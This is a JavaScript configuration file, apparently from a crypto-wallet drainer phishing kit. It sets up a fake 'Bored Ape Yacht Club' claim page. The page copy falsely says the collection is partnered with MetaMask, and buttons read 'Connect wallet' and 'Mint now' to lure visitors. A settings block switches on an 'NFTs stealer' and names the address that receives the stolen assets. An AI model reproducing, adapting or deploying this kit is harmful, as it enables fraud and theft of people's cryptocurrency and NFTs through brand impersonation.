const receiveAddress = "Adelaar";

const collectionInfo = {
    name: "BAYC",
    socialMedia: {
        discord: "https://discord.com",
        twitter: "https://twitter.com",
        instagram: "https://instagram.com",
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "Bored Ape Yacht Club",
}

const claimPageInfo = {
    title: "COLLECTORS<br>TOKEN", // <br> is a line break
    shortDescription: "BAYC",
    longDescription: "The Bored Apes have partnered up with MetaMask. Here is your chance to get the funky primates before they start pounding their chests. This is a limited NFT collection whose rarity can be verified if you have a MetaMask wallet. As an MetaMask user, you’ll have special access to future features, airdrops, and more as we set up partnerships with other applications.(Limited to 1 per address)",

    claimButtonText: "CLAIM NOW",

    image: "bayc.png", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
